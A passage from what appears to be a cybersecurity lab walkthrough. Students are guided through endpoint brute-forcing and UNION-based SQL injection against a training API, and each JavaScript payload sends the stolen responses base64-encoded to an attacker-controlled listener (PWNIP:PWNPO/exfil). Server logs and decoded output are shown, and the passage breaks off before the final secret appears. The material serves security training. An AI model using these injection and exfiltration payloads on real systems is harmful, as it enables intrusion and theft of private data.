VhZGNydW1iLWl0ZW0gYWN0aXZlIj48c3Bhbj5BZG1pbiBQYW5lbDwvc3Bhbj48L2xpPgogICAgICAgICAgICA8L29sPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgogICAgICA8ZGl2IGNsYXNzPSJib2R5IGZsZXgtZ3Jvdy0xIHB4LTMiPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1sZyI+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIG1iLTQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImQtZmxleCBqdXN0aWZ5LWNvbnRlbnQtYmV0d2VlbiI+CiAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICA8aDQgY2xhc3M9ImNhcmQtdGl0bGUgbWItMCI+QWRtaW4gUGFuZWwgLSBDdXN0b21lcnM8L2g0PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgIDwhLS0gTG9hZCBkYXRhIGZyb20gQVBJIC0tPgogICAgICAgICAgICAgIDxzY3JpcHQgc3JjPSJqcy9hcGkuanMiPjwvc2NyaXB0PgoKICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0YWJsZS1yZXNwb25zaXZlIj4KICAgICAgICAgICAgICAgICAgICA8dGFibGUgY2xhc3M9InRhYmxlIGJvcmRlciBtYi0wIiBpZD0ibXlUYWJsZSI+CiAgICAgICAgICAgICAgICAgICAgICA8dGhlYWQgY2xhc3M9InRhYmxlLWxpZ2h0IGZ3LXNlbWlib2xkIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyIGNsYXNzPSJhbGlnbi1taWRkbGUiPgogICAgICAgICAgICAgICAgICAgICAgICAgIDx0aD5OYW1lPC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgICA8dGg+QWRkcmVzczwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgICA8L3RoZWFkPgogICAgICAgICAgICAgICAgICAgICAgPHRib2R5PgogICAgICAgICAgICAgICAgICAgICAgPC90Ym9keT4KICAgICAgICAgICAgICAgICAgICA8L3RhYmxlPgogICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8IS0tIC8uY2FyZC5tYi00LS0+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8IS0tIENvcmVVSSBhbmQgbmVjZXNzYXJ5IHBsdWdpbnMtLT4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL0Bjb3JldWkvY29yZXVpL2pzL2NvcmV1aS5idW5kbGUubWluLmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL3NpbXBsZWJhci9qcy9zaW1wbGViYXIubWluLmpzIj48L3NjcmlwdD4KICAgIDwhLS0gUGx1Z2lucyBhbmQgc2NyaXB0cyByZXF1aXJlZCBieSB0aGlzIHZpZXctLT4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL2NoYXJ0LmpzL2pzL2NoYXJ0Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHNyYz0idmVuZG9ycy9AY29yZXVpL2NoYXJ0anMvanMvY29yZXVpLWNoYXJ0anMuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9InZlbmRvcnMvQGNvcmV1aS91dGlscy9qcy9jb3JldWktdXRpbHMuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9ImpzL21haW4uanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9ImpzL2xvZ2ljLmpzIj48L3NjcmlwdD4KCiAgPC9ib2R5Pgo8L2h0bWw+ | base64 -dAgPHNjcmlwdCBzcmM9ImpzL2xvZ2ljLmpzIj48L3Njcml

<!DOCTYPE html>
<html lang="en">
  <head>
    <base href="./">
    <meta charset="utf-8">

<SNIP>

 <!-- Load data from API -->
              <script src="js/api.js"></script>

<SNIP>
```

The admin panel reveals the location of an `api.js` file. Subsequently, students need to browse to `https://vulnerablesite.htb/js/api.js` and view its contents:

Code: js

```js
fetch("https://api.vulnerablesite.htb/v1/customers", {
    method: "GET"
}).then((response) => {
    return response.json();
}).then((data) => {
    // add to DOM
    var table = document.getElementById("myTable");
    for (let i = 0; i < data['customers'].length; i++) {
        let obj = data['customers'][i];
        var row = table.insertRow();
        var cell1 = row.insertCell();
        var cell2 = row.insertCell();
        cell1.innerHTML = obj[1];
        cell2.innerHTML = obj[2];
    }
});
```

This script reveals the location of an API, `https://api.vulnerablesite.htb/v1/customers`.

Students will find that direct access to the `customers` endpoint is blocked. Therefore, students need to use a brute-forcer to identify other endpoint(s) within the API.

Code: js

```js
var endpoints = ['access-token','account','accounts','amount','balance','balances','bar','baz','bio','bios','category','channel','chart','circular','company','content','contract','coordinate','credentials','creds','custom','customer','customers','details','dir','directory','dob','email','employee','event','favorite','feed','foo','form','github','gmail','group','history','image','info','item','job','link','links','location','log','login','logins','logs','map','member','members','messages','money','my','name','names','news','option','options','pass','password','passwords','phone','picture','pin','post','prod','production','profile','profiles','publication','record','sale','sales','set','setting','settings','setup','site','test','theme','token','tokens','twitter','union','url','user','username','users','vendor','vendors','version','website','work','yahoo'];

for (i in endpoints){
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('GET', \`https://api.vulnerablesite.htb/v1/${endpoints[i]}\`, false);
		xhr.send();
		
		if (xhr.status != 404){
			var exfil = new XMLHttpRequest();
			exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(endpoints[i]), false);
			exfil.send();
		}
	} catch {
		// do nothing
	}
}
```

Checking the exploit server, students will find two endpoints are returned:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.233.63 - - [28/Jan/2025 06:59:59] code 404, message File not found
10.129.233.63 - - [28/Jan/2025 06:59:59] "GET /exfil?r=Y3VzdG9tZXI= HTTP/1.1" 404 -
10.129.233.63 - - [28/Jan/2025 06:59:59] code 404, message File not found
10.129.233.63 - - [28/Jan/2025 06:59:59] "GET /exfil?r=Y3VzdG9tZXJz HTTP/1.1" 404 -
```

Students need to decode these responses, identifying `customer` and `customers` endpoint:

Code: shell

```shell
echo Y3VzdG9tZXI= | base64 -d
echo Y3VzdG9tZXJz | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ echo Y3VzdG9tZXI= | base64 -d

customer

┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ echo Y3VzdG9tZXJz | base64 -d

customers
```

Students need to enumerate the `customer` endpoint further:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.vulnerablesite.htb/v1/customer', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

However, students will find the API returns an error response, indicating a customer ID must be specified:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.233.63 - - [28/Jan/2025 07:03:52] code 404, message File not found
10.129.233.63 - - [28/Jan/2025 07:03:52] "GET /exfil?r=eyJlcnJvciI6IlBsZWFzZSBzcGVjaWZ5IGEgY3VzdG9tZXIgSUQifQo= HTTP/1.1" 404 -
```

Code: shell

```shell
echo eyJlcnJvciI6IlBsZWFzZSBzcGVjaWZ5IGEgY3VzdG9tZXIgSUQifQo= | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ echo eyJlcnJvciI6IlBsZWFzZSBzcGVjaWZ5IGEgY3VzdG9tZXIgSUQifQo= | base64 -d

{"error":"Please specify a customer ID"}
```

Students need to specify an ID like so:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.vulnerablesite.htb/v1/customer/1', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

By specifying an ID, students will see that they can successfully fetch customer information from the database:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.233.63 - - [28/Jan/2025 07:06:58] code 404, message File not found
10.129.233.63 - - [28/Jan/2025 07:06:58] "GET /exfil?r=eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== HTTP/1.1" 404 -
```

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== | base64 -d

{"customer":{"address":"3638 Goosetown Drive, Asheville, NC 28806","name":"Josh N. Bradley"}}
```

Students need to test for SQL injection against the `customer` endpoint:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' OR '1'='1' -- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>
  
10.129.233.63 - - [28/Jan/2025 07:09:17] code 404, message File not found
10.129.233.63 - - [28/Jan/2025 07:09:17] "GET /exfil?r=eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== HTTP/1.1" 404 -
```

The API returns the same response as before; confirming the injection vulnerability:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== | base64 -d

{"customer":{"address":"3638 Goosetown Drive, Asheville, NC 28806","name":"Josh N. Bradley"}}
```

Students need to modify their payload, using the `ORDER BY` function to discover the number of columns in the table being returned. Students need to first test for `3` columns:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/1' ORDER BY 3-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.233.63 - - [28/Jan/2025 07:12:22] code 404, message File not found
10.129.233.63 - - [28/Jan/2025 07:12:22] "GET /exfil?r=eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== HTTP/1.1" 404 -
```

The API successfully returns user data while ordering column `3`:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== | base64 -d

{"customer":{"address":"3638 Goosetown Drive, Asheville, NC 28806","name":"Josh N. Bradley"}}
```

However, when attempting to order by column `4`, students will see the API returns an error:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/1' ORDER BY 4-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>
  
10.129.233.63 - - [28/Jan/2025 07:15:28] code 404, message File not found
10.129.233.63 - - [28/Jan/2025 07:15:28] "GET /exfil?r=eyJlcnJvciI6IlNvbWV0aGluZyB3ZW50IHdyb25nIn0K HTTP/1.1" 404 -
```

Code: shell

```shell
echo eyJlcnJvciI6IlNvbWV0aGluZyB3ZW50IHdyb25nIn0K | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ echo eyJlcnJvciI6IlNvbWV0aGluZyB3ZW50IHdyb25nIn0K | base64 -d

{"error":"Something went wrong"}
```

Therefore, students will know that the table has `3` columns. With this information, students need to use `UNION` injection to further enumerate the database, beginning by enumerating the backend DBMS in use. Students need to use the `@@version` payload to test for `MySQL`:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' UNION SELECT 1,2,@@version-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>
  
10.129.233.63 - - [28/Jan/2025 07:18:35] code 404, message File not found
10.129.233.63 - - [28/Jan/2025 07:18:35] "GET /exfil?r=eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMTAuMTEuNi1NYXJpYURCLTArZGViMTJ1MSIsIm5hbWUiOiIyIn19Cg== HTTP/1.1" 404 -
```

Decoding the response, students will confirm that the DBMS in use is `MySQL`:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMTAuMTEuNi1NYXJpYURCLTArZGViMTJ1MSIsIm5hbWUiOiIyIn19Cg== | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMTAuMTEuNi1NYXJpYURCLTArZGViMTJ1MSIsIm5hbWUiOiIyIn19Cg== | base64 -d

{"customer":{"address":"10.11.6-MariaDB-0+deb12u1","name":"2"}}
```

Next, students need to use the `database()` payload to find the current database:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' UNION SELECT 1,2,database()-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PNWPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.233.63 - - [28/Jan/2025 07:21:41] code 404, message File not found
10.129.233.63 - - [28/Jan/2025 07:21:41] "GET /exfil?r=eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiZGIiLCJuYW1lIjoiMiJ9fQo= HTTP/1.1" 404 -
```

Decoding the exfiltrated response, students will see the database is named `db`:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiZGIiLCJuYW1lIjoiMiJ9fQo= | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiZGIiLCJuYW1lIjoiMiJ9fQo= | base64 -d

{"customer":{"address":"db","name":"2"}}
```

Knowing the name of the database, students now need to enumerate tables:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' UNION select 1,2,TABLE_NAME from INFORMATION_SCHEMA.TABLES where table_schema='db'-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-2gnz3ymbg3]─[~]
└──╼ [★]$ python3 server.py

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.233.63 - - [28/Jan/2025 07:24:00] code 404, message File not found
10.129.233.63 - - [28/Jan/2025 07:24:00] "GET /exfil?r=eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiZmlsZXMiLCJuYW1lIjoiMiJ9fQo= HTTP/1.1" 404 -
```

Students will note that the API returns only one row of data, and only the `files` table is revealed:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiZmlsZXMiLCJuYW1lIjoiMiJ9fQo= | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5ixo9dqyuj]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiZmlsZXMiLCJuYW1lIjoiMiJ9fQo= | base64 -d

{"customer":{"address":"files","name":"2"}}
```

Students need to enumerate additional tables:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' UNION select 1,2,TABLE_NAME from INFORMATION_SCHEMA.TABLES where table_schema='db' AND TABLE_NAME !='files'-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5ixo9dqyuj]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.187.237 - - [29/Jan/2025 01:14:59] code 404, message File not found
10.129.187.237 - - [29/Jan/2025 01:14:59] "GET /exfil?r=eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiY3VzdG9tZXJzIiwibmFtZSI6IjIifX0K HTTP/1.1" 404 -
```

The `customers` table is returned next:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiY3VzdG9tZXJzIiwibmFtZSI6IjIifX0K | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5ixo9dqyuj]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiY3VzdG9tZXJzIiwibmFtZSI6IjIifX0K | base64 -d

{"customer":{"address":"customers","name":"2"}}
```

Students need to continue the enumeration of tables:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' UNION select 1,2,TABLE_NAME from INFORMATION_SCHEMA.TABLES where table_schema='db' AND TABLE_NAME !='files' AND TABLE_NAME !='customers'-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5ixo9dqyuj]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.187.237 - - [29/Jan/2025 01:18:08] code 404, message File not found
10.129.187.237 - - [29/Jan/2025 01:18:08] "GET /exfil?r=eyJjdXN0b21lciI6eyJhZGRyZXNzIjoidXNlcnMiLCJuYW1lIjoiMiJ9fQo= HTTP/1.1" 404 -
```

The `users` table returned next:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoidXNlcnMiLCJuYW1lIjoiMiJ9fQo= | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5ixo9dqyuj]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoidXNlcnMiLCJuYW1lIjoiMiJ9fQo= | base64 -d

{"customer":{"address":"users","name":"2"}}
```

Students need to continue the enumeration of tables:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' UNION select 1,2,TABLE_NAME from INFORMATION_SCHEMA.TABLES where table_schema='db' AND TABLE_NAME !='files' AND TABLE_NAME !='customers' AND TABLE_NAME !='users'-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5ixo9dqyuj]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.187.237 - - [29/Jan/2025 01:20:27] code 404, message File not found
10.129.187.237 - - [29/Jan/2025 01:20:27] "GET /exfil?r=eyJjdXN0b21lciI6eyJhZGRyZXNzIjoic2VjcmV0ZGF0YSIsIm5hbWUiOiIyIn19Cg== HTTP/1.1" 404 -
```

The `secretdata` table is revealed:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoic2VjcmV0ZGF0YSIsIm5hbWUiOiIyIn19Cg== | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5ixo9dqyuj]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoic2VjcmV0ZGF0YSIsIm5hbWUiOiIyIn19Cg== | base64 -d

{"customer":{"address":"secretdata","name":"2"}}
```

Now, students need to enumerate the columns present in the `secretdata` table:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a'  UNION select 1,2,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='secretdata'-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5ixo9dqyuj]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.187.237 - - [29/Jan/2025 01:22:46] code 404, message File not found
10.129.187.237 - - [29/Jan/2025 01:22:46] "GET /exfil?r=eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiaWQiLCJuYW1lIjoiMiJ9fQo= HTTP/1.1" 404 -
```

The first column revealed is `id`:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiaWQiLCJuYW1lIjoiMiJ9fQo= | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5ixo9dqyuj]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiaWQiLCJuYW1lIjoiMiJ9fQo= | base64 -d

{"customer":{"address":"id","name":"2"}}
```

Students need to enumerate additional columns:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a'  UNION select 1,2,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='secretdata' AND COLUMN_NAME !='id'-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5ixo9dqyuj]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.187.237 - - [29/Jan/2025 01:25:06] code 404, message File not found
10.129.187.237 - - [29/Jan/2025 01:25:06] "GET /exfil?r=eyJjdXN0b21lciI6eyJhZGRyZXNzIjoic2VjcmV0ZGF0YSIsIm5hbWUiOiIyIn19Cg== HTTP/1.1" 404 -
```

A second column, `secretdata` is now revealed:

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoic2VjcmV0ZGF0YSIsIm5hbWUiOiIyIn19Cg== | base64 -d
```
```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5ixo9dqyuj]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoic2VjcmV0ZGF0YSIsIm5hbWUiOiIyIn19Cg== | base64 -d

{"customer":{"address":"secretdata","name":"2"}}
```

Finally, students need to query the contents of the `secretdata` column from the `secretdata` table:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' UNION SELECT 1,2,secretdata FROM secretdata-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```
```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5ixo9dqyuj]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.187.237 - - [29/Jan/2025 01:27:26] code 404, message File not found
